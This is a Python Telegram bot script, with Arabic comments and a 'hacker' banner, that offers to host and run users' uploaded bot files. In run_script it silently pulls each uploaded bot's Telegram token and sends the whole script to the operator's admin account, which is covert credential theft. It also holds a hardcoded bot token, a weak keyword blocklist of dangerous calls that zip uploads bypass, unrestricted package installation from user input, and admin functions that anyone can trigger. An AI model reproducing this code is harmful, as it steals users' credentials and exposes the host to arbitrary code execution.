###############
#BLACK
#@Y_U_U_X
###############

import sys
import os
import subprocess
import zipfile
import tempfile
import shutil
import re
import importlib
import time

# تثبيت مكتبة إذا لم تكن موجودة
def ensure_module_installed(module_name, install_name=None):
    try:
        importlib.import_module(module_name)
    except ImportError:
        print(f"📦 جاري تثبيت المكتبة: {module_name} ...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", install_name or module_name])

# تثبيت المكتبات المطلوبة تلقائيًا
ensure_module_installed("requests")
ensure_module_installed("telebot", "pyTelegramBotAPI")
ensure_module_installed("flask")

# بعد التأكد من التثبيت، نبدأ الاستيراد الكامل
import requests
import telebot
from telebot import types
from flask import Flask, request

# ============ الإعدادات الأساسية ============
TOKEN = '7987463096:AAHv121UW_Gb1SbYiT4gs67pe6upucdmRpI'  # توكن البوت
ADMIN_ID = 7384683084  # معرف الأدمن الأساسي

channel = ''  # قناة الاشتراك الإجباري
developer_channel = channel  # قناة المطور

bot = telebot.TeleBot(TOKEN)

# ============ قوائم المستخدمين ============
allowed_users = {ADMIN_ID}   # المستخدمين المسموح لهم (الأدمن الأساسي والمضافين لاحقاً)
registered_users = {}        # المستخدمين الذين قاموا بالتسجيل (بانتظار الموافقة)
blocked_users = set()        # المستخدمين المحظورين
admin_list = {ADMIN_ID}      # قائمة الأدمن، يبدأ بالأدمن الأساسي

# بيانات رفع الملفات (لكل مستخدم: {"next_allowed_time": timestamp, "extra": عدد الملفات الإضافية})
user_upload_data = {}

# مسار تخزين الملفات المرفوعة
uploaded_files_dir = 'uploaded_bots'
if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)

# لتخزين بيانات البوتات المشغلة (المفتاح: "<chatID>_<bot_number>")
bot_scripts = {}

# قائمة المكتبات القياسية التي لا حاجة للتثبيت
STANDARD_LIBS = {
    "os", "sys", "time", "re", "subprocess", "logging", "shutil",
    "tempfile", "zipfile", "requests", "telebot"
}

# ============ دالة عرض بانر الهكر ============
def show_hacker_banner():
    banner = r"""
         ___    ____  ____  _  _   ___   __  __  ____ 
        / __)  (  _  _ \/ ) / __) (  \/  )(  _ \
       ( (__    ) _ < )   / )  (  \__ \  )    (  ) _ (
        \___)  (____/(_)\_)(_/\/(___/ (_/\/\_)(____/
           ▄██████████▄ 
         ▄███▀▀▀▀▀▀▀███▄
        ██▀   HACKER   ▀██
       ██     ☠️  ☠️    ██
       ██   TAKE CONTROL ██
        ██             ██
         ▀██▄       ▄██▀
           ▀█████████▀
    """
    print(banner)
    print("( بانر هكر بأسلوب ASCII )")

# ============ دالة للتحقق من الملفات الضارة ============
def is_file_safe(file_content):
    # قائمة بالكلمات أو الأنماط الضارة التي نريد التحقق منها
    malicious_patterns = [
        "import os",  # مثال على نمط ضار
        "import sys",
        "subprocess.call",
        "eval(",
        "exec(",
        "__import__(",
        "open(",
        "os.system(",
        "os.popen("
    ]
    
    for pattern in malicious_patterns:
        if pattern in file_content:
            return False
    return True

# ============ الدوال المساعدة ============

# السماح لكل المستخدمين مباشرة بدون اشتراك أو تسجيل أو انتظار موافقة الأدمن
def check_allowed(user_id):
    return True, "", False

def get_user_main_folder(user_id):
    folder = os.path.join(uploaded_files_dir, f"bot_{user_id}")
    if not os.path.exists(folder):
        os.makedirs(folder)
    return folder

def get_next_bot_number(user_id):
    user_folder = get_user_main_folder(user_id)
    existing = [
        d for d in os.listdir(user_folder)
        if os.path.isdir(os.path.join(user_folder, d)) and d.startswith("bot_")
    ]
    numbers = []
    for folder in existing:
        try:
            num = int(folder.split("_")[-1])
            numbers.append(num)
        except:
            pass
    return max(numbers) + 1 if numbers else 1

def verify_installed_libraries(script_path):
    try:
        with open(script_path, 'r') as f:
            content = f.read()
        modules = set(re.findall(
            r'^\s*(?:import|from)\s+([a-zA-Z_][a-zA-Z0-9_]*)',
            content, re.MULTILINE
        ))
        to_check = [m for m in modules if m not in STANDARD_LIBS]
        errors = []
        for module in to_check:
            try:
                importlib.import_module(module)
            except ImportError:
                errors.append(module)
        if errors:
            return False, errors
        return True, []
    except Exception as e:
        return False, [str(e)]

def auto_install_libraries(script_path):
    try:
        with open(script_path, 'r') as f:
            content = f.read()
        modules = set(re.findall(
            r'^\s*(?:import|from)\s+([a-zA-Z_][a-zA-Z0-9_]*)',
            content, re.MULTILINE
        ))
        for module in modules:
            if module in STANDARD_LIBS:
                continue
            try:
                importlib.import_module(module)
            except ImportError:
                bot.send_message(ADMIN_ID, f"🔄 محاولة تثبيت المكتبة: {module} ...")
                try:
                    subprocess.check_call(
                        [sys.executable, "-m", "pip", "install", "--user", module],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                except Exception as e:
                    bot.send_message(
                        ADMIN_ID,
                        f"❌ فشل تثبيت المكتبة {module}.\nالخطأ: {e}"
                    )
    except Exception as e:
        print(f"[ERROR] أثناء تثبيت المكتبات التلقائية: {e}")

def install_requirements(folder):
    req_file = os.path.join(folder, 'requirements.txt')
    if os.path.exists(req_file):
        bot.send_message(ADMIN_ID, f"🔄 تثبيت المتطلبات من {req_file} ...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--user", "-r", req_file],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ فشل تثبيت المتطلبات.\nالخطأ: {e}")

def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r') as script_file:
            content = script_file.read()
            token_match = re.search(r"[\"']([0-9]{9,10}:[A-Za-z0-9_-]+)[\"']", content)
            if token_match:
                return token_match.group(1)
            else:
                print(f"[WARNING] لم يتم العثور على توكن في {script_path}")
    except Exception as e:
        print(f"[ERROR] فشل استخراج التوكن من {script_path}: {e}")
    return None

def run_script(script_path, chat_id, folder_path, bot_number):
    try:
        bot.send_message(chat_id, f"🚀 تشغيل البوت (بوت {bot_number}) على مدار الساعة...")
        session_name = f"bot_{chat_id}_{bot_number}"
        subprocess.check_call(["screen", "-dmS", session_name, sys.executable, script_path])
        bot_scripts[f"{chat_id}_{bot_number}"] = {
            'session': session_name,
            'folder_path': folder_path,
            'file': script_path
        }
        token = extract_token_from_script(script_path)
        if token:
            bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
            if bot_info.get('ok'):
                bot_username = bot_info['result']['username']
                caption = f"📤 @{chat_id} رفع بوت جديد.\n🔰 @{bot_username}"
                bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)
            else:
                bot.send_message(chat_id, "✅ تم تشغيل البوت، لكن لم يتم استخراج معرف البوت.")
                bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption="📤 بوت جديد بدون معرف.")
        else:
            bot.send_message(chat_id, "✅ تم تشغيل البوت، لكن لم يتم استخراج معرف البوت.")
            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption="📤 بوت جديد بدون معرف.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء تشغيل البوت: {e}")

def stop_bot_by_session(chat_id, bot_number):
    key = f"{chat_id}_{bot_number}"
    if key in bot_scripts and bot_scripts[key].get('session'):
        subprocess.call(["screen", "-S", bot_scripts[key]['session'], "-X", "quit"])
        bot.send_message(chat_id, f"🔴 تم إيقاف بوت {bot_number}.")
        del bot_scripts[key]
    else:
        bot.send_message(chat_id, "⚠️ لا يوجد بوت يعمل بهذا الرقم.")

def delete_bot_by_session(chat_id, bot_number):
    key = f"{chat_id}_{bot_number}"
    if key in bot_scripts:
        if bot_scripts[key].get('session'):
            subprocess.call(["screen", "-S", bot_scripts[key]['session'], "-X", "quit"])
        folder_path = bot_scripts[key].get('folder_path')
        if folder_path and os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            bot.send_message(chat_id, f"🗑️ تم حذف ملفات بوت {bot_number}.")
        else:
            bot.send_message(chat_id, "⚠️ المجلد غير موجود.")
        del bot_scripts[key]
    else:
        bot.send_message(chat_id, "⚠️ لا يوجد بيانات لهذا البوت.")

# تم تعديل دالة تنزيل الملفات لإرسال الملفات بشكل فردي (وليس بصيغة ZIP)
def download_files_func(chat_id):
    try:
        files_list = []
        for root, dirs, files in os.walk(uploaded_files_dir):
            for file in files:
                files_list.append(os.path.join(root, file))
        if not files_list:
            bot.send_message(chat_id, "⚠️ لا توجد ملفات مرفوعة.")
            return
        for file_path in files_list:
            if os.path.isfile(file_path):
                with open(file_path, 'rb') as f:
                    bot.send_document(chat_id, f)
    except Exception as e:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء تنزيل الملفات: {e}")

# ============ معالجات الرسائل ============
@bot.message_handler(func=lambda m: m.from_user.id in blocked_users)
def handle_blocked(message):
    bot.send_message(message.chat.id, "⚠️ أنت محظور من استخدام البوت.")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    # السماح للجميع مباشرة بدون تحقق أو اشتراك أو انتظار موافقة الأدمن
    info_text = (
        f"👤 معلوماتك:\n"
        f"• ID: {user_id}\n"
        f"• Username: @{message.from_user.username if message.from_user.username else 'غير متوفر'}\n"
        f"• الاسم: {message.from_user.first_name}"
    )
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('📤 رفع ملف', callback_data='upload'),
        types.InlineKeyboardButton('📥 تنزيل مكتبة', callback_data='download_lib'),
        types.InlineKeyboardButton('⚡ سرعة البوت', callback_data='speed'),
        types.InlineKeyboardButton(
            '🔔 قناة المطور',
            url=f"https://t.me/TP_Q_T"
        )
    )
    if user_id in admin_list:
        markup.add(types.InlineKeyboardButton('⚙️ لوحة الأدمن', callback_data='admin_panel'))
    bot.send_message(
        message.chat.id,
        f"مرحباً، {message.from_user.first_name}! 👋\n{info_text}\n✨ استخدم الأزرار أدناه للتحكم:",
        reply_markup=markup
    )

@bot.message_handler(commands=['register'])
def register_user(message):
    bot.send_message(message.chat.id, "لم يعد هناك حاجة للتسجيل. يمكنك استخدام البوت مباشرة.")

# ============ أوامر البوت التفاعلية ============
@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    bot.send_message(call.message.chat.id, "📄 من فضلك، أرسل الملف الذي تريد رفعه.")

@bot.callback_query_handler(func=lambda call: call.data == 'download_lib')
def ask_library_name(call):
    bot.send_message(call.message.chat.id, "📥 أرسل اسم المكتبة التي تريد تنزيلها.")
    bot.register_next_step_handler(call.message, install_library)

def install_library(message):
    library_name = message.text.strip()
    try:
        importlib.import_module(library_name)
        bot.send_message(message.chat.id, f"✅ المكتبة {library_name} مثبتة مسبقاً.")
        return
    except ImportError:
        pass
    bot.send_message(message.chat.id, f"⏳ جاري تنزيل المكتبة: {library_name}...")
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "--user", library_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        bot.send_message(message.chat.id, f"✅ تم تثبيت المكتبة {library_name} بنجاح.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ فشل في تثبيت المكتبة {library_name}.\nالخطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    try:
        start_time = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, f"⚡ سرعة البوت: {latency:.2f} ثانية.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ فشل في الحصول على سرعة البوت.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ أثناء فحص سرعة البوت: {e}")

# استقبال الملفات
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    allowed_flag, msg, need_subscribe = check_allowed(user_id)
    if not allowed_flag:
        if need_subscribe:
            markup = types.InlineKeyboardMarkup()
            join_button = types.InlineKeyboardButton(
                'اشترك في القناة',
                url=f"https://t.me/{channel.lstrip('@')}"
            )
            markup.add(join_button)
            bot.send_message(message.chat.id, msg, reply_markup=markup)
        else:
            bot.send_message(message.chat.id, msg)
        return

    # تم حذف التحقق من المدة والعدد، الآن يمكن للجميع رفع ملفات بلا حدود

    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        original_file_name = message.document.file_name

        # تحقق من سلامة الملف
        if original_file_name.endswith('.py'):
            file_content = downloaded_file.decode('utf-8', errors='ignore')
            if not is_file_safe(file_content):
                bot.send_message(message.chat.id, "⚠️ الملف يحتوي على تعليمات برمجية ضارة. الرفع مرفوض.")
                return

        user_main_folder = get_user_main_folder(user_id)
        bot_number = get_next_bot_number(user_id)
        bot_folder = os.path.join(user_main_folder, f"bot_{bot_number}")
        os.makedirs(bot_folder)

        if original_file_name.endswith('.zip'):
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_zip_path = os.path.join(temp_dir, original_file_name)
                with open(temp_zip_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                with zipfile.ZipFile(temp_zip_path, 'r') as zip_ref:
                    zip_ref.extractall(bot_folder)
        elif original_file_name.endswith('.py'):
            dest_file = os.path.join(bot_folder, f"bot_{bot_number}.py")
            with open(dest_file, 'wb') as new_file:
                new_file.write(downloaded_file)
            if not os.path.exists(os.path.join(bot_folder, 'requirements.txt')):
                auto_install_libraries(dest_file)
        else:
            bot.reply_to(message, "⚠️ يُسمح برفع ملفات بايثون أو zip فقط.")
            return

        install_requirements(bot_folder)
        main_file = None
        candidate_run = os.path.join(bot_folder, "run.py")
        candidate_bot = os.path.join(bot_folder, "bot.py")
        candidate_numbered = os.path.join(bot_folder, f"bot_{bot_number}.py")

        if os.path.exists(candidate_run):
            main_file = candidate_run
        elif os.path.exists(candidate_bot):
            main_file = candidate_bot
        elif os.path.exists(candidate_numbered):
            main_file = candidate_numbered

        if not main_file:
            bot.send_message(
                message.chat.id,
                "❓ لم أتمكن من العثور على الملف الرئيسي لتشغيل البوت.\nيرجى إرسال اسم الملف الذي ترغب بتشغيله."
            )
            bot_scripts[f"{user_id}_{bot_number}"] = {'folder_path': bot_folder}
            bot.register_next_step_handler(message, get_custom_file_to_run)
        else:
            verified, missing = verify_installed_libraries(main_file)
            if not verified:
                bot.send_message(
                    message.chat.id,
                    f"❌ لم يتم تثبيت المكتبات المطلوبة: {', '.join(missing)}.\nيرجى مراجعة الأدمن."
                )
                return
            run_script(main_file, message.chat.id, bot_folder, bot_number)
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton(
                    f"🔴 إيقاف بوت {bot_number}",
                    callback_data=f"stop_{user_id}_{bot_number}"
                ),
                types.InlineKeyboardButton(
                    f"🗑️ حذف بوت {bot_number}",
                    callback_data=f"delete_{user_id}_{bot_number}"
                )
            )
            bot.send_message(
                message.chat.id,
                "✅ تم رفع وتشغيل البوت بنجاح. استخدم الأزرار للتحكم:",
                reply_markup=markup
            )
    except Exception as e:
        bot.reply_to(message, f"❌ حدث خطأ: {e}")

def get_custom_file_to_run(message):
    try:
        chat_id = message.chat.id
        keys = [k for k in bot_scripts if k.startswith(f"{chat_id}_")]
        if not keys:
            bot.send_message(chat_id, "❌ لا يوجد بيانات محفوظة للمجلد.")
            return
        key = keys[0]
        folder_path = bot_scripts[key]['folder_path']
        custom_file_path = os.path.join(folder_path, message.text.strip())
        if os.path.exists(custom_file_path):
            run_script(custom_file_path, chat_id, folder_path, key.split('_')[-1])
        else:
            bot.send_message(chat_id, "❌ الملف الذي حددته غير موجود. تأكد من الاسم وحاول مرة أخرى.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def callback_stop_bot(call):
    parts = call.data.split('_')
    if len(parts) >= 3:
        chat_id = parts[1]
        bot_number = parts[2]
        stop_bot_by_session(chat_id, bot_number)

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_'))
def callback_delete_bot(call):
    parts = call.data.split('_')
    if len(parts) >= 3:
        chat_id = parts[1]
        bot_number = parts[2]
        delete_bot_by_session(chat_id, bot_number)

# ============ لوحة الأدمن التفاعلية ============
@bot.callback_query_handler(func=lambda call: call.data == 'admin_panel')
def show_admin_panel(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton('🚫 حظر مستخدم', callback_data='prompt_ban'),
        types.InlineKeyboardButton('✅ فك الحظر', callback_data='prompt_unban'),
        types.InlineKeyboardButton('🔓 السماح', callback_data='prompt_allow'),
        types.InlineKeyboardButton('🗑️ حذف مستخدم', callback_data='prompt_remove'),
        types.InlineKeyboardButton('📋 عرض الملفات', callback_data='list_files'),
        types.InlineKeyboardButton('📥 تنزيل الملفات', callback_data='download_files'),
        types.InlineKeyboardButton('➕ زيادة رفع الملفات', callback_data='prompt_add_upload'),
        types.InlineKeyboardButton('➖ تقليل رفع الملفات', callback_data='prompt_sub_upload'),
        types.InlineKeyboardButton('🗑️ حذف مكتبة', callback_data='prompt_remove_lib'),
        types.InlineKeyboardButton('📢 بث رسالة', callback_data='prompt_broadcast'),
        types.InlineKeyboardButton('👥 عرض المستخدمين', callback_data='list_users'),
        types.InlineKeyboardButton('🔴 إيقاف بوت', callback_data='prompt_stopfile'),
        types.InlineKeyboardButton('⏹️ إيقاف جميع البوتات', callback_data='stopall'),
        types.InlineKeyboardButton('🗑️ حذف جميع البوتات', callback_data='deleteall'),
        types.InlineKeyboardButton('➕ إضافة أدمن', callback_data='prompt_add_admin'),
        types.InlineKeyboardButton('➖ إزالة أدمن', callback_data='prompt_remove_admin')
    )
    bot.send_message(call.message.chat.id, "🛠️ لوحة الأدمن التفاعلية:", reply_markup=markup)

# ============ وظائف الأدمن التفاعلية ============
@bot.callback_query_handler(func=lambda call: call.data == 'prompt_ban')
def prompt_ban(call):
    msg = bot.send_message(call.message.chat.id, "أرسل معرف المستخدم الذي تريد حظره:")
    bot.register_next_step_handler(msg, process_ban)

def process_ban(message):
    try:
        user_id = int(message.text.strip())
        blocked_users.add(user_id)
        bot.send_message(message.chat.id, f"🚫 تم حظر المستخدم {user_id}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_unban')
def prompt_unban(call):
    msg = bot.send_message(call.message.chat.id, "أرسل معرف المستخدم الذي تريد فك حظره:")
    bot.register_next_step_handler(msg, process_unban)

def process_unban(message):
    try:
        user_id = int(message.text.strip())
        blocked_users.discard(user_id)
        bot.send_message(message.chat.id, f"✅ تم فك الحظر عن المستخدم {user_id}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_allow')
def prompt_allow(call):
    msg = bot.send_message(call.message.chat.id, "أرسل معرف المستخدم الذي تريد السماح له:")
    bot.register_next_step_handler(msg, process_allow)

def process_allow(message):
    try:
        user_id = int(message.text.strip())
        allowed_users.add(user_id)
        registered_users.pop(user_id, None)
        bot.send_message(message.chat.id, f"✅ تم السماح للمستخدم {user_id} باستخدام البوت.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_remove')
def prompt_remove(call):
    msg = bot.send_message(call.message.chat.id, "أرسل معرف المستخدم الذي تريد حذفه من قائمة المسموح لهم:")
    bot.register_next_step_handler(msg, process_remove)

def process_remove(message):
    try:
        user_id = int(message.text.strip())
        allowed_users.discard(user_id)
        bot.send_message(message.chat.id, f"🗑️ تم حذف المستخدم {user_id} من قائمة المسموح لهم.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'list_files')
def callback_list_files(call):
    try:
        if not os.path.exists(uploaded_files_dir):
            bot.send_message(call.message.chat.id, "⚠️ لا توجد ملفات مرفوعة.")
            return
        files_list = []
        for root, dirs, files in os.walk(uploaded_files_dir):
            for file in files:
                files_list.append(os.path.join(root, file))
        if not files_list:
            bot.send_message(call.message.chat.id, "⚠️ لا توجد ملفات مرفوعة.")
        else:
            text = "📋 قائمة الملفات المرفوعة:\n" + "\n".join(files_list)
            if len(text) > 4000:
                with open("files_list.txt", "w", encoding="utf-8") as f:
                    f.write(text)
                with open("files_list.txt", "rb") as f:
                    bot.send_document(call.message.chat.id, f)
                os.remove("files_list.txt")
            else:
                bot.send_message(call.message.chat.id, text)
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ أثناء عرض الملفات: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'download_files')
def callback_download_files(call):
    download_files_func(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_add_upload')
def prompt_add_upload(call):
    msg = bot.send_message(call.message.chat.id, "أرسل البيانات بصيغة: <ID> <عدد> لزيادة رفع الملفات:")
    bot.register_next_step_handler(msg, process_add_upload)

def process_add_upload(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "⚠️ استخدم الصيغة: <ID> <عدد>")
            return
        target_id = int(parts[0])
        amount = int(parts[1])
        user_data = user_upload_data.get(target_id, {"next_allowed_time": 0, "extra": 0})
        user_data["extra"] += amount
        user_upload_data[target_id] = user_data
        bot.send_message(message.chat.id, f"✅ تمت زيادة رفع الملفات للمستخدم {target_id} بمقدار {amount}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_sub_upload')
def prompt_sub_upload(call):
    msg = bot.send_message(call.message.chat.id, "أرسل البيانات بصيغة: <ID> <عدد> لتقليل رفع الملفات:")
    bot.register_next_step_handler(msg, process_sub_upload)

def process_sub_upload(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "⚠️ استخدم الصيغة: <ID> <عدد>")
            return
        target_id = int(parts[0])
        amount = int(parts[1])
        user_data = user_upload_data.get(target_id, {"next_allowed_time": 0, "extra": 0})
        user_data["extra"] = max(user_data["extra"] - amount, 0)
        user_upload_data[target_id] = user_data
        bot.send_message(message.chat.id, f"✅ تمت تقليل رفع الملفات للمستخدم {target_id} بمقدار {amount}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_remove_lib')
def prompt_remove_lib(call):
    msg = bot.send_message(call.message.chat.id, "أرسل اسم المكتبة التي تريد حذفها:")
    bot.register_next_step_handler(msg, process_remove_lib)

def process_remove_lib(message):
    try:
        lib_name = message.text.strip()
        bot.send_message(message.chat.id, f"⏳ جاري حذف المكتبة {lib_name}...")
        subprocess.check_call(
            [sys.executable, "-m", "pip", "uninstall", "-y", lib_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        bot.send_message(message.chat.id, f"✅ تم حذف المكتبة {lib_name} نهائياً.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ فشل حذف المكتبة {lib_name}.\nالخطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_broadcast')
def prompt_broadcast(call):
    msg = bot.send_message(call.message.chat.id, "أرسل الرسالة التي تريد بثها لجميع المستخدمين:")
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(message):
    try:
        broadcast_text = message.text
        count = 0
        target_users = set(registered_users.keys()) | allowed_users | admin_list
        for uid in target_users:
            try:
                bot.send_message(uid, f"📢 رسالة من الأدمن:\n\n{broadcast_text}")
                count += 1
            except Exception as e:
                print(f"Error sending broadcast to {uid}: {e}")
        bot.send_message(message.chat.id, f"✅ تم بث الرسالة إلى {count} مستخدم.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'list_users')
def list_users(call):
    try:
        if not registered_users:
            bot.send_message(call.message.chat.id, "⚠️ لا يوجد مستخدمين مسجلين.")
            return
        text = "📋 قائمة المستخدمين المسجلين:\n"
        for uid, info in registered_users.items():
            text += f"ID: {uid} - Username: @{info.get('username', 'غير متوفر')} - Name: {info.get('first_name','')}\n"
        bot.send_message(call.message.chat.id, text)
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_stopfile')
def prompt_stopfile(call):
    msg = bot.send_message(call.message.chat.id, "أرسل البيانات بصيغة: <user_id> <bot_number> لإيقاف بوت محدد:")
    bot.register_next_step_handler(msg, process_stopfile)

def process_stopfile(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "⚠️ استخدم الصيغة: <user_id> <bot_number>")
            return
        chat_id = parts[0]
        bot_number = parts[1]
        stop_bot_by_session(chat_id, bot_number)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'stopall')
def stop_all(call):
    try:
        keys = list(bot_scripts.keys())
        count = 0
        for key in keys:
            session = bot_scripts[key].get('session')
            if session:
                subprocess.call(["screen", "-S", session, "-X", "quit"])
                count += 1
            del bot_scripts[key]
        bot.send_message(call.message.chat.id, f"🔴 تم إيقاف {count} بوت.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'deleteall')
def delete_all(call):
    try:
        keys = list(bot_scripts.keys())
        for key in keys:
            session = bot_scripts[key].get('session')
            if session:
                subprocess.call(["screen", "-S", session, "-X", "quit"])
            del bot_scripts[key]
        for item in os.listdir(uploaded_files_dir):
            item_path = os.path.join(uploaded_files_dir, item)
            if os.path.isdir(item_path):
                shutil.rmtree(item_path)
            else:
                os.remove(item_path)
        bot.send_message(call.message.chat.id, "🗑️ تم حذف جميع ملفات البوت وإيقاف جميع الجلسات.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_add_admin')
def prompt_add_admin(call):
    msg = bot.send_message(call.message.chat.id, "أرسل معرف المستخدم لإضافته كأدمن:")
    bot.register_next_step_handler(msg, process_add_admin)

def process_add_admin(message):
    try:
        new_admin = int(message.text.strip())
        admin_list.add(new_admin)
        allowed_users.add(new_admin)
        bot.send_message(message.chat.id, f"✅ تمت إضافة المستخدم {new_admin} كأدمن.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'prompt_remove_admin')
def prompt_remove_admin(call):
    msg = bot.send_message(call.message.chat.id, "أرسل معرف الأدمن الذي تريد إزالته:")
    bot.register_next_step_handler(msg, process_remove_admin)

def process_remove_admin(message):
    try:
        rem_admin = int(message.text.strip())
        if rem_admin in admin_list and rem_admin != ADMIN_ID:
            admin_list.discard(rem_admin)
            allowed_users.discard(rem_admin)
            bot.send_message(message.chat.id, f"✅ تمت إزالة الأدمن {rem_admin}.")
        else:
            bot.send_message(message.chat.id, "⚠️ لا يمكن إزالة الأدمن الأساسي أو المستخدم غير موجود.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")

# ============ مسار Webhook (ضعه قبل التشغيل فقط) ============
app = Flask(__name__)
@app.route("/webhook", methods=["POST"])

def webhook():
    if request.headers.get("content-type") == "application/json":
        json_str = request.get_data().decode("utf-8")
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return "OK", 200
    return "Unsupported Media Type", 415

# ============ بدء التشغيل ============
if __name__ == "__main__":
    show_hacker_banner()

    # إزالة Webhook السابق (اختياري)
    bot.remove_webhook()

    # تعيين Webhook الجديد (تأكد من أنك وضعت رابط Replit الصحيح هنا)
    bot.set_webhook(url="https://zil.onrender.com/webhook")

    # تشغيل خادم Flask (يبقي البوت يعمل عبر Webhook)
    app.run(host="0.0.0.0", port=8080)
